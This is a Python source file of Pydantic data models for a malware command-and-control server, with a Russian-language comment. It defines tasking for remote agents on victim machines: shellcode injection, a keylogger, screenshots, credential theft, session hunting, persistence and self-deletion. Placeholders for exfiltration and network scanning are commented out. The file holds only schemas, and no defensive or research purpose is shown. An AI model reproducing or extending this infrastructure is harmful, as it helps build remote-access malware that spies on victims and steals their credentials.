from enum import Enum
from typing import Dict, Any, Optional
from pydantic import BaseModel, Field

class CommandType(str, Enum):
    EXECUTE_SHELL = "execute_shell"
    GET_SYSTEM_INFO = "get_system_info"
    INJECT_SHELLCODE = "inject_shellcode"
    START_KEYLOGGER = "start_keylogger"
    STOP_KEYLOGGER = "stop_keylogger"
    GET_KEYLOGS = "get_keylogs"
    SCREENSHOT = "screenshot"
    STEAL_CREDENTIALS = "steal_credentials"
    SCAN_FILES = "scan_files"
    FIND_APP_SESSIONS = "find_app_sessions"
    PERSIST = "persist"
    SELF_DELETE = "self_delete"
    # Добавить другие типы команд
    # EXFILTRATE = "exfiltrate"
    # SCAN_NETWORK = "scan_network"

class Task(BaseModel):
    task_id: str
    command: CommandType
    params: Dict[str, Any] = Field(default_factory=dict)
    status: str = "pending" # pending, running, completed, failed
    result: Optional[Any] = None
    error: Optional[str] = None
    created_at: float
    updated_at: Optional[float] = None

class AgentInfo(BaseModel):
    agent_id: str
    os: str
    hostname: str
    ip_address: str
    # user: str
    # pid: int
    last_checkin: float
    status: str = "online" # online, offline
    tasks: Dict[str, Task] = Field(default_factory=dict)

class C2Response(BaseModel):
    status: str
    message: Optional[str] = None
    data: Optional[Any] = None 